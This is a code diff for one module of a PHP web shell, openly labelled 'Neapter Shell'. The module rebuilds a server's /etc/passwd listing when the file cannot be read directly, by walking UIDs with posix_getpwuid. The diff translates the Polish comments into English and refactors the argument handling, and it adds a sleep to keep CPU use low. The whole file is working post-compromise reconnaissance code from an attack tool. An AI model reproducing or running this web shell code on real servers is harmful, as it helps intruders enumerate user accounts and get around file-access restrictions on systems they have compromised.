@@ -3,27 +3,31 @@
 /**
  * Neapter Shell
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @license   http://www.gnu.org/licenses/gpl-3.0.txt
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 
 /**
- * Odwzorowanie zawartosci pliku /etc/passwd
+ * Get all users in system, if you cannot read /etc/passwd file directly
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @package    NeapterShell
- * @subpackage Modules
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 class ModuleEtcPasswd extends ModuleAbstract
 {
     /**
-     * Dostepna lista komend
+     * Get list of available commands
      *
-     * @access public
      * @return array
      */
     public static function getCommands()
@@ -32,9 +36,8 @@ class ModuleEtcPasswd extends ModuleAbstract
     }
 
     /**
-     * Zwracanie wersji modulu
+     * Get module version
      *
-     * @access public
      * @return string
      */
     public static function getVersion()
@@ -42,13 +45,12 @@ class ModuleEtcPasswd extends ModuleAbstract
         /**
          * Wersja Data Autor
          */
-        return '1.00 2011-06-04 - <krzotr@gmail.com>';
+        return '1.0.1 2016-06-14 - <krzotr@gmail.com>';
     }
 
     /**
-     * Zwracanie pomocy modulu
+     * Execute module
      *
-     * @access public
      * @return string
      */
     public static function getHelp()
@@ -59,7 +61,7 @@ Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid
 	Użycie:
 		etcpasswd
 
-		etcpasswd [limit_dolny] [limit_górny]
+		etcpasswd limit_dolny limit_górny
 
 	Przykład:
 
@@ -69,66 +71,60 @@ DATA;
     }
 
     /**
-     * Wywolanie modulu
+     * Execute module
      *
-     * @access public
      * @return string
      */
     public function get()
     {
-        /**
-         * Help
-         */
-        if ($this->oShell->iArgc === 1) {
-            return self::getHelp();
-        }
-
-        /**
-         * Nie mozemy uruchomic tego na windowsie
-         */
-        if ($this->oShell->bWindows) {
+        if ($this->oUtils->isWindows()) {
             return 'Nie można uruchomić tego na windowsie';
         }
 
-        /**
-         * funkcja posix_getpwuid musi istniec
-         */
-        if ($this->oShell->bFuncOwnerById) {
+        if (!function_exists('posix_getpwuid')
+            || in_array('posix_getpwuid', $this->oUtils->getDisabledFunctions())
+        ) {
             return 'Funkcja "posix_getpwuid" nie istnieje';
         }
 
-        /**
-         * Dolny zakres
-         */
-        if (isset($this->oShell->aArgv[0]) && (($this->oShell->aArgv[0] < 0) || ($this->oShell->aArgv[0] > 65534))) {
-            return 'Błędny zakres dolny';
+        $iMin = 0;
+        $iMax = 65535;
+
+        if ($this->oArgs->getNumberOfParams() == 2) {
+            $iMin = $this->oArgs->getParam(0);
+            $iMax = $this->oArgs->getParam(1);
+
+            if (($iMin < 0) || ($iMin > 65535)) {
+                return 'Błędny zakres dolny';
+            }
+
+            if (($iMin > $iMax) || ($iMax > 65535)) {
+                return 'Błędny zakres górny';
+            }
         }
 
-        /**
-         * Gorny zakres
-         */
-        if (isset($this->oShell->aArgv[1]) && (($this->oShell->aArgv[0] > $this->oShell->aArgv[1]) || ($this->oShell->aArgv[1] > 65534))) {
-            return 'Błędny zakres górny';
-        }
+        $sOutput = '';
 
-        $sOutput = NULL;
+        for ($i = $iMin; $i <= $iMax; ++$i) {
+            if (($aUser = posix_getpwuid($i)) !== false) {
+                $sOutput .= sprintf(
+                    "%s:%s:%d:%d:%s:%s:%s\r\n",
+                    $aUser['name'],
+                    $aUser['passwd'],
+                    $aUser['uid'],
+                    $aUser['gid'],
+                    $aUser['gecos'],
+                    $aUser['dir'],
+                    $aUser['shell']
+                );
+            }
 
-        $iMin = (isset($this->oShell->aArgv[0]) ? $this->oShell->aArgv[0] : 0);
-        $iMax = (isset($this->oShell->aArgv[1]) ? $this->oShell->aArgv[1] : 65535);
-
-        /**
-         * Iteracja
-         */
-        for ($i = $iMin; $i <= $iMax; $i++) {
-            if (($aUser = posix_getpwuid($i)) !== FALSE) {
-                /**
-                 * Wzor jak dla pliku /etc/passwd
-                 */
-                $sOutput .= sprintf("%s:%s:%d:%d:%s:%s:%s\r\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell']);
+            if ($i % 250 === 0) {
+                /* Avoid 100% CPU usage */
+                usleep(mt_rand(25000, 50000));
             }
         }
 
         return $sOutput;
     }
-
 }
